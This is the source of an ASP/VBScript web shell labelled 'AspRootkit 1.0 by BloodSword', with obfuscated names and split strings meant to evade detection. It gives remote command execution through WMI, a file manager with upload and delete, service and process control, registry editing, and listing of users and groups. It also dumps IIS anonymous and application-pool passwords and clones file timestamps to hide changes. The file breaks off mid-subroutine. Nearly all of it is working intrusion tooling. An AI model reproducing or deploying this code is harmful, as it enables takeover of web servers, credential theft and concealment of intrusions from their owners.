<%@ LANGUAGE='VBScript' CODEPAGE='65001'%>
<%
Response.Buffer=True
Response.Charset="utf-8"
Server.ScriptTimeOut=300
'-------------------------------Config-------------------------------
Const zvhy=False
Const ybd=43
Const qjr=False
Const miih="."
Const xdl="vqsbz|jzgm|ndie|puvgw|rrr"
Const cbrh="GB2312"
'-------------------------------Config-------------------------------
Dim goaction,vqsbz,jzgm,ndie,puvgw,dut,blhvq,erd,ykzg,jnnb,zfbn,fac,vqt,cwp,wbk,jozsz,rqg,nedsl,acxze,cxkyk,igiqh,xxyj,spmh,yug,mhve,xacj,iqg,rsq,szgk,xnqtl,zsckm,gkyv,rrr,anpj,mee,mgy,eoz,bnes,bljd,fmsm,jpklj,zgn,eduj,edg,fnc
xacj="AspRootkit 1.0 by BloodSword"
If Request(goaction)="" And Trim(gbba("AUTH_USER"))="" Then
Response.Status="401 Unauthorized"
Response.Addheader"WWW-AuThenticate", "NTLM"
If gbba("AUTH_USER")=""Then Response.End
'zhv"You did'nt login as the system administrators,there's lots of things you can't do -_-~!"
End If
sndu()
Select Case goaction
Case"pmy"
ditm()
Case"ulxbb"
ylka()
Case"jdwtp"
muwq()
Case"kqmyb"
efbac()
Case"lmwgb"
snrt()
Case"umh"
qvetz()
Case"ukpy"
ihm()
Case"xcngn"
ehyx()
Case"bbr"
cyk()
Case"xpodw"
qxbon()
Case Else
cyk()
End Select
sbbo()
Sub sndu()
If Not qjr Then On Error Resume Next
zfbn=Timer()
Dim ndrck,xxzhu,qvtlx,fzro,vgm,tkl,isp
servurl=gbba("URL")
Set dut=mfmq("Script"&nrh&"ing.File"&nvkq&"SystemObject")
Set erd=mfmq("Sh"&kpa&"ell.Applicat"&ffr&"ion")
Set blhvq=new RegExp
blhvq.Global=True
blhvq.IgnoreCase=True
blhvq.MultiLine=True
For Each xxzhu In request.queryString
execute""&xxzhu&"=request.queryString("""&xxzhu&""")"
Next
For Each ndrck In request.Form
execute""&ndrck&"=request.form("""&ndrck&""")"
Next
isp=Split(xdl,"|")
For Each tkl In isp
execute""&tkl&"=wdhw("&tkl&")"
Next
xnqtl=gbba("SERVER_NAME")
ykzg=gbba("PATH_INFO")
jnnb=LCase(smfap(ykzg,"/"))
vqt=dhh(".")
cwp=dhh("/")
If acxze<>"tngdz"And Right(vqsbz,1)="\"Then vqsbz=Left(vqsbz,Len(vqsbz)-1)
If Len(vqsbz)=2 Then vqsbz=vqsbz&"\"
nedsl=1
jozsz=1
End Sub
Sub sbbo()
If Not qjr Then On Error Resume Next
Dim apwc
Set dut=Nothing
Set erd=Nothing
Set blhvq=Nothing
Set zsckm=Nothing
fac=timer()
apwc=fac-zfbn
echo"<br></div>"
ltvq"100%"
echo"<tr class=""head"">"
echo"<td>"
eedi wbk
apwc=FormatNumber(apwc,5)
If Left(apwc,1)="."Then apwc="0"&apwc
eedi"<br>"
echo"<div align=right>Processed in :"&apwc&"seconds</div></td></tr></table></body></html>"
Response.End()
End Sub
Sub cyk()
goaction="bbr"
If Not qjr Then On Error Resume Next
If vqsbz=""Then vqsbz=puvgw
If vqsbz=""Then vqsbz=vqt
If acxze="down"Then
qws()
Response.End()
End If
fpx("FSO File Explorer")
Select Case acxze
Case"oql","sgqly"
vuh()
vqsbz=lgk(vqsbz,"\",False)
Case"vwsrt"
vwsrt()
Case"save","seii"
tyh()
vqsbz=lgk(vqsbz,"\",False)
Case"tngdz"
uvrs()
vqsbz=lgk(vqsbz,"\",False)
Case"wqj","rjfr"
wqj()
Case"wsf","nhlnt"
mgxnb()
vqsbz=lgk(vqsbz,"\",False)
Case"tbqwf","ejgn","vihy","ewvk"
jreg()
vqsbz=lgk(vqsbz,"\",False)
Case"uzmjs"
ywqif()
Case"ffgo"
ywc()
vqsbz=lgk(vqsbz,"\",False)
End Select
If Len(vqsbz)<3 Then vqsbz=vqsbz&"\"
bbr()
End Sub
Sub bbr()
Dim aqwr,qvgzg,lwn,tlknr,xmg,kyirr,qsob,woaee
If Not qjr Then On Error Resume Next
Set aqwr=dut.GetFolder(vqsbz)
tlknr=dut.GetParentFolderName(vqsbz)
woaee=vqsbz
If Right(woaee,1)<>"\"Then woaee=woaee&"\"
xze"woaee",woaee
ztlif True
echo"Current Path :"
pisa"text","vqsbz",vqsbz,120,""
eedi""
uxzf"","170px","onchange=""javascript:if(this.value!=''){adwba('"&goaction&"','',this.value);}"""
zepw"","Drivers/Comm folders"
zepw HtmlEncode(dhh(".")),"."
zepw HtmlEncode(dhh("/")),"/"
zepw"","----------------"
For Each drive In dut.Drives
zepw drive.DriveLetter&":\",drive.DriveLetter&":\"
Next
zepw"","----------------"
zepw"C:\Program Files","C:\Program Files"
zepw"C:\Program Files\RhinoSoft.com","RhinoSoft.com"
zepw"C:\Program Files\Serv-U","Serv-U"
zepw"C:\Program Files\Radmin","Radmin"
zepw"C:\Program Files\Microsoft SQL Server","Mssql"
zepw"C:\Program Files\Mysql","Mysql"
zepw"","----------------"
zepw"C:\Documents and Settings\All Users","All Users"
zepw"C:\Documents and Settings\All Users\Documents","Documents"
zepw"C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere","PcAnywhere"
zepw"C:\Documents and Settings\All Users\Start Menu\Programs","Start Menu->Programs"
zepw"","----------------"
zepw"D:\Program Files","D:\Program Files"
zepw"D:\Serv-U","D:\Serv-U"
zepw"D:\Radmin","D:\Radmin"
zepw"D:\Mysql","D:\Mysql"
fndid
adwba"Go"
zro
eedi"<br><form method=""post"" id=""upform""action="""&ykzg&"""enctype=""multipart/form-data"">"
pisa"file","file","","",""
echo"Save As : "
pisa"text","vqsbz",vqsbz,40,""
pisa"checkbox","xxyj",1,"",""
echo" OverWrite "
pisa"button","","Upload","","onclick=""javascript:adwba('"&goaction&"','tngdz','')"""
zro
ztlif True
pisa"text","yug","",20,""
xze"vqsbz",vqsbz
xze"acxze","vwsrt"
pisa"radio","mhve","file","","checked"
echo"File"
pisa"radio","mhve","folder","",""
echo"Folder"
adwba"New one"
zro
echo"<hr>"
If Not dut.FolderExists(vqsbz)Then
zhv vqsbz&" Folder dosen't exists or access denied!"
sbbo
End If
iquhg"Folders",False
ltvq"100%"
tygwb
doTd"<b>Folder name</b>","20%"
doTd"<b>Size</b>","20%"
doTd"<b>Last modified</b>","20%"
doTd"<b>Action</b>","40%"
igl
abywz 0
eedi"<td colspan=""4""><a href=""javascript:adwba('"&goaction&"','','"&utzvg(tlknr)&"')"">Parent Directory</a></td>"
igl
jozsz=1
For Each objX In aqwr.SubFolders
qsob=objX.DateLastModified
abywz jozsz
doTd"<a href=""javascript:adwba('"&goaction&"','','"&objX.Name&"');"">"&objX.Name&"</a>",""
doTd htmlEncode("<dir>"),""
doTd qsob,""
echo"<td>"
eedi"<a href=""javascript:adwba('"&goaction&"','vihy','"&objX.Name&"')"">Copy</a> -"
eedi"<a href=""javascript:adwba('"&goaction&"','ewvk','"&objX.Name&"')"">Move</a> -"
eedi"<a href=""javascript:adwba('"&goaction&"','nhlnt','"&objX.Name&"')"">Rename</a> -"
eedi"<a href=""javascript:adwba('"&goaction&"','sgqly','"&objX.Name&"')"">Delete</a>"
eedi"</td>"
igl
uuuk
Next
xlvqe
eedi"</span><br>"
iquhg"Files",False
ltvq"100%"
echo"<b>"
tygwb
doTd"<b>File name</b>","20%"
doTd"<b>Size</b>","20%"
doTd"<b>Last modified</b>","20%"
doTd"<b>Action</b>","40%"
igl
echo"</b>"
jozsz=0
For Each objX In aqwr.Files
xmg=pkn(objX.Size)
qsob=objX.DateLastModified
If LCase(Left(objX.Path,Len(cwp)))<>LCase(cwp) Then
qvgzg=""
Else
qvgzg=Replace(Replace(qtyi(Mid(objX.Path,Len(cwp) + 1)),"%2E","."),"+","%20")
End If
abywz jozsz
If qvgzg=""Then
doTd objX.Name,""
Else
doTd"<a href='"&Replace(qvgzg,"%5C","/")&"' target=_blank>"&objX.Name&"</a>",""
End If
doTd xmg,""
doTd qsob,""
echo"<td>"
eedi"<a href=""javascript:adwba('"&goaction&"','wqj','"&objX.Name&"')"">Edit</a> -"
eedi"<a href=""javascript:adwba('"&goaction&"','tbqwf','"&objX.Name&"')"">Copy</a> -"
eedi"<a href=""javascript:adwba('"&goaction&"','ejgn','"&objX.Name&"')"">Move</a> -"
eedi"<a href=""javascript:adwba('"&goaction&"','wsf','"&objX.Name&"')"">Rename</a> -"
eedi"<a href=""javascript:adwba('"&goaction&"','down','"&objX.Name&"')"">Down</a> -"
eedi"<a href=""javascript:adwba('"&goaction&"','uzmjs','"&objX.Name&"')"">Attributes</a> -"
eedi"<a href=""javascript:adwba('"&goaction&"','oql','"&objX.Name&"')"">Delete</a>"
eedi"</td>"
igl
uuuk
Next
xlvqe
echo"</span>"
smeb(Err)
End Sub
Sub ywqif()
Dim qwsdh,npyi,gwp,cxmsb,afqj,advu,yiq,nqui
If Not qjr Then On Error Resume Next
If IsObject(dut)Then
Set qwsdh=dut.GetFile(vqsbz)
End If
If IsObject(erd)Then
yiq=lgk(vqsbz,"\",False)
gwp=smfap(vqsbz,"\")
Set advu=erd.NameSpace(yiq)
Set npyi=advu.ParseName(gwp)
End If
echo"<center>"
ltvq"60%"
ztlif True
xze"acxze","ffgo"
xze"vqsbz",vqsbz
tygwb
ncxl"Set attribute","40%"
doTd vqsbz,"60%"
igl
abywz 0
doTd"Attributes",""
If IsObject(dut)Then
afqj=qwsdh.Attributes
cxmsb="<input type=checkbox name=szgk value=4 class='input' {$system}>system "
cxmsb=cxmsb&"<input type=checkbox name=szgk value=2 class='input' {$hidden}>hide "
cxmsb=cxmsb&"<input type=checkbox name=szgk value=1 class='input' {$readonly}>readonly "
cxmsb=cxmsb&"<input type=checkbox name=szgk value=32 class='input' {$archive}>save "
If afqj>=128 Then afqj=afqj-128
If afqj>=64 Then afqj=afqj-64
If afqj>=32 Then
afqj=afqj-32
cxmsb=Replace(cxmsb, "{$archive}", "checked")
End If
If afqj>=16 Then afqj=afqj-16
If afqj>=8 Then afqj=afqj-8
If afqj>=4 Then
afqj=afqj-4
cxmsb=Replace(cxmsb, "{$system}", "checked")
End If
If afqj>=2 Then
afqj=afqj-2
cxmsb=Replace(cxmsb, "{$hidden}", "checked")
End If
If afqj>=1 Then
afqj=afqj-1
cxmsb=Replace(cxmsb, "{$readonly}", "checked")
End If
doTd cxmsb,""
Else
doTd"FSO object disabled,can't get/set attributes -_-~!",""
End If
igl
If IsObject(erd)Then
abywz 1
doTd"Date created",""
doTd advu.GetDetailsOf(npyi,4),""
igl
abywz 0
doTd"Date last modified",""
luhhh"text","iqg",advu.GetDetailsOf(npyi,3),"","",""
igl
abywz 1
doTd"Date last accessed",""
doTd advu.GetDetailsOf(npyi,5),""
igl
Else
abywz 1
doTd"Date created",""
doTd qwsdh.DateCreated,""
igl
abywz 0
doTd"Date last modified",""
doTd qwsdh.DateLastModified,""
igl
abywz 1
doTd"Date last accessed",""
doTd qwsdh.DateLastAccessed,""
igl
End If
zro
ztlif True
xze"acxze","ffgo"
xze"vqsbz",vqsbz
abywz 0
If IsObject(erd)Then
ncxl"Clone time ",""
echo"<td>"
uxzf"rsq","100%",""
For Each objX In advu.Items
If Not objX.IsFolder Then
nqui=smfap(objX.Path,"\")
zepw nqui,advu.GetDetailsOf(advu.ParseName(nqui),3)&" --- "&nqui
End If
Next
Else
echo"<td colspan=2>App object disabled,can't modify time -_-~!</td>"
End If
xlvqe
zro
sbbo()
End Sub
Sub ywc()
If Not qjr Then On Error Resume Next
Dim nboac,qwsdh,yiq,gwp,advu,npyi
If IsObject(dut)Then
Set qwsdh=dut.GetFile(vqsbz)
End If
If IsObject(erd)Then
yiq=lgk(vqsbz,"\",False)
gwp=smfap(vqsbz,"\")
Set advu=erd.NameSpace(yiq)
Set npyi=advu.ParseName(gwp)
End If
'echo szgk
If szgk<>""Then
szgk=Split(Replace(szgk," ",""),",")
echo"fuck"
For i=0 To UBound(szgk)
nboac=nboac+CInt(szgk(i))
Next
qwsdh.Attributes=nboac
If Err Then
smeb(Err)
Else
zhv"Attributes modified"
End If
End If
If iqg<>"" And IsDate(iqg)Then
npyi.ModifyDate=iqg
If Err Then
smeb(Err)
Else
zhv"Time modified"
End If
End If
If rsq<>""Then
npyi.ModifyDate=advu.GetDetailsOf(advu.ParseName(rsq),3)
If Err Then
smeb(Err)
Else
zhv"Time modified"
End If
End If
End Sub
Function pkn(yxa)
If yxa>=(1024 * 1024 * 1024)Then pkn=Fix((yxa /(1024 * 1024 * 1024))* 100)/ 100&"G"
If yxa>=(1024 * 1024)And yxa<(1024 * 1024 * 1024)Then pkn=Fix((yxa /(1024 * 1024))* 100)/ 100&"M"
If yxa>=1024 And yxa<(1024 * 1024)Then pkn=Fix((yxa / 1024)* 100)/ 100&"K"
If yxa>=0 And yxa<1024 Then pkn=yxa&"B"
End Function
Sub wqj()
If Not qjr Then On Error Resume Next
Dim theFile,xzgyk,ooz,ifc
If Right(vqsbz,1)="\"Then
zhv"Can't edit a directory!"
sbbo
End If
ooz=lgk(vqsbz,"\",False)
ztlif True
If acxze="wqj" Then
xzgyk=tortz(vqsbz)
Else
xzgyk=zhxc(vqsbz)
End If
smeb(Err)
pvrd"spmh",xzgyk,"100%","25",""
If acxze="rjfr" Then
xze"acxze","seii"
Else
xze"acxze","save"
End If
echo"Save as :"
pisa"text","vqsbz",vqsbz,"60",""
echo" Encode:"
uxzf"act","80px","onchange=""javascript:if(this.value!=''){adwba('"&goaction&"',this.value,'"&utzvg(vqsbz)&"');}"""
zepw"wqj","Default"
ifc="<option value=""rjfr"" {$}>Utf-8</option>"
If acxze="rjfr" Then
ifc=Replace(ifc,"{$}","selected")
End If
echo ifc
fndid
echo" "
adwba"Save"
echo" "
pisa"reset","","Reset","",""
echo" "
pisa"button","clear","Clear","","onclick=""javascript:this.form.spmh.innerText=''"""
echo" "
pisa"button","","Go back","","onclick=""javascript:adwba('"&goaction&"','','"&utzvg(ooz)&"')"""
zro
smeb(Err)
sbbo
End Sub
Sub tyh()
If Not qjr Then On Error Resume Next
If acxze="save" Then
vtyjq vqsbz,spmh
Else
oooeu vqsbz,spmh
End If
If Err Then
smeb(Err)
Else
zhv"File saved."
End If
End Sub
Sub ditm()
fpx("Cmd Shell")
Dim wolw,ss,oc,snqsz,vdtyh
If Not qjr Then On Error Resume Next
If jzgm<>"" Then
Set zsckm=dtwz("wi"&kcb&"nmgmts:\\.\ro"&todxo&"ot\ci"&dmly&"mv2")
Set wolw=zsckm.Get("Win32_Pro"&ivj&"cess")
set ss=zsckm.get("Win32_ProcessSta"&uyy&"rtup")
Set oc=ss.SpawnInstance_
oc.ShowWindow=12
snqsz=wolw.create(jzgm,null,oC,vdtyh)
If snqsz=0 Then
zhv"com"&sruz&"mand execute succeed!Refresh the iframe below to check result."
Else
zhv"com"&sruz&"mand execute fail-_-!RPWT?"
End If
Set wolw=Nothing
Set ss=Nothing
Set oc=Nothing
ElseIf acxze="viewResult" Then
Response.Clear
echo "<body bgcolor='#ededed'>"&htmlEncode(tortz(rrr))&"</body>"
Response.End
End If
smeb(Err)
ltvq"100%"
ztlif True
abywz 1
doTd"com"&sruz&"mand","10%"
If jzgm=""Then jzgm="cmd.exe /c net user"
If rrr=""Then rrr=cwp&"\temp.txt"
luhhh"text","jzgm",jzgm,"80%","",""
ncxl"Run ",""
igl
abywz 0
doTd">",""
luhhh"text","rrr",rrr,"","",""
luhhh"button","","Echo","","onclick='javascript:this.form.jzgm.value=this.form.jzgm.value+"" > ""+this.form.rrr.value'",""
igl
zro
xlvqe
echo"<hr>"
pisa"button","","Refresh result","","onclick=""javascript:argnp()"""
echo"<br><br><iframe id='cmdResult' class='frame' frameborder='no'></iframe>"
End Sub
Sub ylka()
fpx("Service List")
Dim glip,bond,kbap
If Not qjr Then On Error Resume Next
Set zsckm=dtwz("wi"&kcb&"nmgmts:\\.\ro"&todxo&"ot\ci"&dmly&"mv2")
If acxze="startone" Or acxze="stopone" Then
gyxm(puvgw)
End If
Set bond=zsckm.InstancesOf("Win3"&dwt&"2_Service")
ltvq "100%"
echo "<tr class='link'>"
doTd "<b>Name</b>",""
doTd "<b>Display Name</b>",""
doTd "<b>Path</b>","40%"
doTd "<b>Start Mode</b>",""
doTd "<b>State</b>",""
doTd "<b>Action</b>",""
igl
jozsz=0
For Each glip In bond
kbap=False
If LCase(glip.State)="running"Then kbap=True
abywz jozsz
doTd glip.Name,""
doTd glip.DisplayName,""
doTd glip.PathName,""
doTd glip.StartMode,""
If kbap Then
snqs glip.State,"green",""
doTd"<a href=""javascript:adwba('"&goaction&"','stopone','"&glip.Name&"')"">Stop</a>",""
Else
snqs glip.State,"red",""
doTd"<a href=""javascript:adwba('"&goaction&"','startone','"&glip.Name&"')"">Start</a>",""
End If
igl
uuuk
Next
End Sub
Sub gyxm(dlzu)
Dim qxau,glip
If Not qjr Then On Error Resume Next
Set zsckm=dtwz("wi"&kcb&"nmgmts:\\.\ro"&todxo&"ot\ci"&dmly&"mv2")
Set qxau=zsckm.ExecQuery("select * from Win3"&dwt&"2_Service where Name='"&dlzu&"'")
For Each glip In qxau
If acxze="startone" Then
glip.StartService()
Else
glip.StopService()
End If
Next
If Err Then
smeb(Err)
Else
zhv"Service successfully start/stoped!"
End If
End Sub
Sub muwq()
fpx("Process List")
Dim cpmvi,ijre,kbap
If Not qjr Then On Error Resume Next
Set zsckm=dtwz("wi"&kcb&"nmgmts:\\.\ro"&todxo&"ot\ci"&dmly&"mv2")
If acxze="stopone" Then
ylwre(puvgw)
End If
Set ijre=zsckm.InstancesOf("Win32_Pro"&ivj&"cess")
ltvq "100%"
echo "<tr class='link'>"
doTd "<b>PID</b>",""
doTd "<b>Name</b>",""
doTd "<b>Path</b>",""
doTd "<b>Action</b>",""
igl
jozsz=0
For Each cpmvi In ijre
abywz jozsz
doTd cpmvi.ProcessId,""
doTd cpmvi.Name,""
doTd cpmvi.ExecutablePath,""
If cpmvi.ExecutablePath<>""Then
doTd"<a href=""javascript:adwba('"&goaction&"','stopone','"&cpmvi.ProcessId&"')"">Terminate</a>",""
Else
doTd"--",""
End If
igl
uuuk
Next
End Sub
Sub ylwre(pid)
Dim ijre,glip
If Not qjr Then On Error Resume Next
Set zsckm=dtwz("wi"&kcb&"nmgmts:\\.\ro"&todxo&"ot\ci"&dmly&"mv2")
Set ijre=zsckm.ExecQuery("select * from Win32_Pro"&ivj&"cess where ProcessId='"&pid&"'")
For Each cpmvi In ijre
If cpmvi.Terminate()=0 Then
zhv"Process terminate succeed!"
Else
zhv"Process terminate fail-_-!"
End If
Next
End Sub
Sub efbac()
If Not qjr Then On Error Resume Next
If ndie=""Then ndie=puvgw
anpj=Split("HKEY_CLASSE"&cbppq&"S_ROOT|HKEY_CURRENT_US"&nhm&"ER|HKEY_LOCAL_MACHI"&toev&"NE|HKEY_U"&lzwqj&"SERS|HKE"&mxdz&"Y_CURRENT_CONFIG","|")
If Right(ndie,1)="\" Then ndie=Left(ndie,Len(ndie)-1)
If InStr(ndie,"\")>0 Then
bljd=lgk(ndie,"\",True)
fmsm=Mid(ndie,Len(bljd)+2)
Else
bljd=ndie
fmsm=""
End If
Select Case UCase(bljd)
Case "HKEY_CLASSE"&cbppq&"S_ROOT"
jpklj=&H80000000
Case "HKEY_CURRENT_US"&nhm&"ER"
jpklj=&H80000001
Case "HKEY_LOCAL_MACHI"&toev&"NE"
jpklj=&H80000002
Case "HKEY_U"&lzwqj&"SERS"
jpklj=&H80000003
Case "HKE"&mxdz&"Y_CURRENT_CONFIG"
jpklj=&H80000004
End Select
Set bnes=dtwz("wi"&kcb&"nmgmts:\\.\ro"&todxo&"ot\default:StdRegP"&bqlnw&"rov")
Select Case acxze
Case "dxc","pppau"
aso()
Case "wscnt"
ncyl()
End Select
fpx("Reg Shell")
ztlif True
ltvq "80%"
abywz 1
doTd"Registry Path","10%"
luhhh"text","ndie",ndie,"80%","",""
ncxl"Go","10%"
igl
abywz 0
echo"<td colspan='3'>"
For Each strRootKey In anpj
echo "<a href=""javascript:adwba('"&goaction&"','','"&strRootKey&"')"">"&strRootKey&"</a> | "
Next
igl
zro
ztlif True
abywz 1
xze "acxze","wscnt"
xze "ndie",ndie
doTd"Name : ",""
echo"<td>"
pisa"text","mee","","30",""
echo" Type : "
uxzf"mgy","120px",""
zepw"key","SubKey"
zepw"str","String"
zepw"bsgop","ExpandedString"
zepw"dwd","DWORD"
zepw"xrvxd","MultiString"
fndid
echo" Value : "
pisa"text","eoz","","50",""
echo"</td>"
ncxl"Set",""
zro
igl
xlvqe
echo"<br><li>Multi string value splits with ',',you can create new items,or just modify what exists : )</li><hr>"
ykoo()
Set bnes=Nothing
End Sub
Sub ykoo()
Dim afd,ssdxp,vfqws
If Not qjr Then On Error Resume Next
iquhg"SubKeys",False
ltvq "100%"
tygwb
doTd"<b>Name</b>",""
doTd"<b>Action</b>",""
igl
If ndie=""Then
jozsz=0
For Each strRootKey In anpj
abywz jozsz
doTd"<a href=""javascript:adwba('"&goaction&"','','"&strRootKey&"')"">"&strRootKey&"</a>",""
doTd"",""
uuuk
Next
Else
abywz 0
echo"<td colspan='2'><a href=""javascript:adwba('"&goaction&"','','"&utzvg(lgk(ndie,"\",False))&"')"">Parent Key</a></td>"
igl
jozsz=1
bnes.EnumKey jpklj,fmsm,afd
If IsArray(afd)Then
For Each strSubKey In afd
abywz jozsz
doTd "<a href=""javascript:adwba('"&goaction&"','','"&strSubKey&"')"">"&strSubKey&"</a>",""
doTd"<a href=""javascript:adwba('"&goaction&"','dxc','"&strSubKey&"')"">Delete</a>",""
igl
uuuk
Next
End If
bnes.EnumValues jpklj,fmsm,ssdxp,vfqws
If IsArray(ssdxp)Then
xlvqe
echo"</span><br>"
iquhg"Values",False
ltvq"100%"
tygwb
doTd"<b>Name</b>",""
doTd"<b>Type</b>",""
doTd"<b>Value</b>",""
doTd"<b>Action</b>",""
igl
jozsz=0
For i=0 To UBound(ssdxp)
ztmjf jpklj,fmsm,ssdxp(i),vfqws(i)
Next
End If
End If
xlvqe
eedi"</span>"
smeb(Err)
End Sub
Sub ztmjf(jpklj,fmsm,gwp,bpz)
Dim vjrs,auya,jdl
If Not qjr Then On Error Resume Next
auya=""
abywz jozsz
Select Case bpz
Case 1
bnes.GetStringValue jpklj,fmsm,gwp,vjrs
jdl="String"
Case 2
bnes.GetExpandedStringValue jpklj,fmsm,gwp,vjrs
jdl="ExpandedString"
Case 3
bnes.GetBinaryValue jpklj,fmsm,gwp,vjrs
jdl="Binary"
Case 4
bnes.GetDWORDValue jpklj,fmsm,gwp,vjrs
jdl="DWORD"
Case 7
bnes.GetMultiStringValue jpklj,fmsm,gwp,vjrs
jdl="MultiString"
End Select
If IsArray(vjrs)Then
If bpz=3 Then
For i=0 To UBound(vjrs)
If CInt(vjrs(i))<16 Then
auya=auya&"0"
End If
auya=auya&CStr(Hex(CInt(vjrs(i))))
Next
Else
auya=Join(vjrs,",")
End If
Else
auya=CStr(vjrs)
End If
doTd gwp,""
doTd jdl,""
doTd auya,""
eedi"<td><a href=""javascript:adwba('"&goaction&"','pppau','"&gwp&"')"">Delete</a>"
igl
uuuk
End Sub
Sub aso()
If Not qjr Then On Error Resume Next
Dim gbca
If acxze="dxc" Then
gbca=bnes.DeleteKey(jpklj,fmsm)
Else
gbca=bnes.DeleteValue(jpklj,lgk(fmsm,"\",False),smfap(fmsm,"\"))
End If
If gbca=0 Then
zhv"Sub key/value delete succeed!"
Else
zhv"Sub key/value delete fail-_-!"
End If
ndie=lgk(ndie,"\",False)
End Sub
Sub ncyl()
If Not qjr Then On Error Resume Next
Dim gbca
Select Case mgy
Case "key"
gbca=bnes.CreateKey(jpklj,fmsm&"\"&mee)
Case "str"
gbca=bnes.SetStringValue(jpklj,fmsm,mee,eoz)
Case "bsgop"
gbca=bnes.SetExpandedStringValue(jpklj,fmsm,mee,eoz)
Case "dwd"
If IsNumeric(eoz)Then
gbca=bnes.SetDWORDValue(jpklj,fmsm,mee,eoz)
Else
zhv"Dword value must be a number!"
Exit Sub
End If
Case "xrvxd"
gbca=bnes.SetMultiStringValue(jpklj,fmsm,mee,Split(eoz,","))
End Select
If gbca=0 Then
zhv"Sub key/value create/modify succeed!"
Else
zhv"Sub key/value create/modify fail-_-!"
End If
End Sub
Sub snrt()
Dim qxe,vula,sru,wetn,uit,boo,vhkdi
If Not qjr Then On Error Resume Next
fpx("IIS Spy Using ADSI")
ltvq"100%"
tygwb
doTd"<b>Name</b>",""
doTd"<b>Domain</b>",""
doTd"<b>IIS_USER</b>",""
doTd"<b>IIS_PASS</b>",""
doTd"<b>APP_USER</b>",""
doTd"<b>APP_PASS</b>",""
doTd"<b>Path</b>",""
jozsz=0
Set vula=dtwz("II"&iung&"S://Loca"&uwevh&"lhost/W3S"&vum&"VC")
For Each obj3w In vula
boo=obj3w.Name
If IsNumeric(boo) Then
qxe=Obj3w.ServerComment
Set domain=dtwz("II"&iung&"S://Loca"&uwevh&"lhost/W3S"&vum&"VC/"&boo)
If isArray(domain.ServerBindings) Then
uit=domain.ServerBindings
sru=""
For i=0 To UBound(uit)
sru=sru+uit(i)+"<br>"
Next
sru=Left(sru,Len(sru)-4)
End If
Set wetn=dtwz("II"&iung&"S://Loca"&uwevh&"lhost/W3S"&vum&"VC/"&boo&"/ro"&todxo&"ot")
Set vhkdi=dtwz("II"&iung&"S://Loca"&uwevh&"lhost/W3S"&vum&"VC/AppPo"&lavjs&"ols/"&wetn.AppPoolId)
abywz jozsz
doTd qxe,""
doTd sru,""
doTd wetn.AnonymousUserName,""
doTd wetn.AnonymousUserPass,""
doTd vhkdi.WAMUserName,""
doTd vhkdi.WAMUserPass,""
doTd "<a href=""javascript:adwba('bbr','','"&utzvg(wetn.path)&"')"">"&wetn.path&"</a>",""
igl
uuuk
End If
Next
xlvqe
Set vula=Nothing
Set wetn=Nothing
Set domain=Nothing
Set wetn=Nothing
smeb(Err)
End Sub
Sub qvetz()
Dim ylz,qifc,xczkb,uwfd
If Not qjr Then On Error Resume Next
Set zsckm=dtwz("wi"&kcb&"nmgmts:\\.\ro"&todxo&"ot\Mi"&brjdx&"crosoftIISv2")
Set ylz=zsckm.InstancesOf("IISWebVirtualDir"&ymy&"Setting")
fpx("IIS Spy Using WMI")
ltvq"100%"
tygwb
doTd"<b>Name</b>",""
doTd"<b>Domain</b>",""
doTd"<b>IIS_USER</b>",""
doTd"<b>IIS_PASS</b>",""
doTd"<b>APP_USER</b>",""
doTd"<b>APP_PASS</b>",""
doTd"<b>Path</b>",""
igl
jozsz=0
For Each objWebDoc In ylz
abywz jozsz
Set qifc=zsckm.ExecQuery("Select ServerComment,ServerBindings from II"&rvx&"SWebServerSetting where Name='"&Replace(objWebDoc.Name,"/ro"&todxo&"ot","",1,-1,1)&"'")
If qifc.Count=0 Then
doTd "",""
doTd "",""
Else
For Each objWebSvr In qifc
tmpdmStr=""
doTd objWebSvr.ServerComment,""
For Each subBind In objWebSvr.ServerBindings
If tmpdmStr<>""Then tmpdmStr=tmpdmStr&"<br>"
tmpdmStr=tmpdmStr&subBind.IP&":"&subBind.Port&":"&subBind.Hostname
Next
doTd tmpdmStr,""
Exit For
Next
End If
doTd objWebDoc.AnonymousUserName,""
doTd objWebDoc.AnonymousUserPass,""
Set xczkb=zsckm.ExecQuery("Select WAMUserName,WAMUserPass from IISAppli"&dwgoq&"cationPoolSetting where Name='W3S"&vum&"VC/AppPo"&lavjs&"ols/"&objWebDoc.AppPoolId&"'")
For Each objWebApp In xczkb
doTd objWebApp.WAMUserName,""
doTd objWebApp.WAMUserPass,""
Exit For
Next
doTd "<a href=""javascript:adwba('bbr','','"&utzvg(objWebDoc.Path)&"')"">"&objWebDoc.Path&"</a>",""
igl
uuuk
Next
xlvqe
Set vula=Nothing
smeb(Err)
End Sub
Sub ihm()
Dim ndk,goeje
If Not qjr Then On Error Resume Next
Set zsckm=dtwz("wi"&kcb&"nmgmts:\\.\ro"&todxo&"ot\ci"&dmly&"mv2")
Set zgn=zsckm.InstancesOf("Win32_UserAccount")
Set eduj=zsckm.InstancesOf("Win32_Group")
fpx("User List")
iquhg "Users",False
ltvq "100%"
For Each edg In zgn
tygwb
eedi"<td align='center' colspan='2'>"&edg.Name&"</td>"
igl
jozsz=0
For Each subProp In edg.Properties_
abywz jozsz
doTd subProp.Name,""
doTd subProp.Value,""
igl
uuuk
Next
Next
xlvqe
echo"</span><br>"
iquhg "Groups",False
ltvq"100%"
For Each fnc In eduj
tygwb
eedi"<td align='center' colspan='2'><b>"&fnc.Name&"</b></td>"
igl
jozsz=0
For Each subProp In fnc.Properties_
abywz jozsz
doTd subProp.Name,""
doTd subProp.Value,""
igl
uuuk
Next
Next
xlvqe
echo"</span>"
smeb(Err)
End Sub
Sub qxbon()
Dim yzka,plz,fmsm
fpx("DataSource List")
If Not qjr Then On Error Resume Next
Set bnes=dtwz("wi"&kcb&"nmgmts:\\.\ro"&todxo&"ot\default:StdRegP"&bqlnw&"rov")
jpklj=&H80000002
fmsm="SOFTW"&cyz&"ARE\ODBC\ODBCINST.INI"
bnes.EnumKey jpklj,fmsm,yzka
ltvq"100%"
tygwb
doTd"<b>DataBase Driver</b>",""
doTd"<b>Driver Path</b>",""
igl
jozsz=0
For Each strOdbcName In yzka
abywz jozsz
doTd strOdbcName,""
bnes.GetStringValue jpklj,fmsm&"\"&strOdbcName,"Driver",plz
doTd plz,""
igl
uuuk
Next
xlvqe
End Sub
Sub ehyx()
Dim sefc,dkb,rrf,umj
If Not qjr Then On Error Resume Next
Set zsckm=dtwz("wi"&kcb&"nmgmts:\\.\ro"&todxo&"ot\ci"&dmly&"mv2")
Set dkb=zsckm.InstancesOf("Win32_OperatingSy"&mvwu&"stem")
fpx("xcngn Tools")
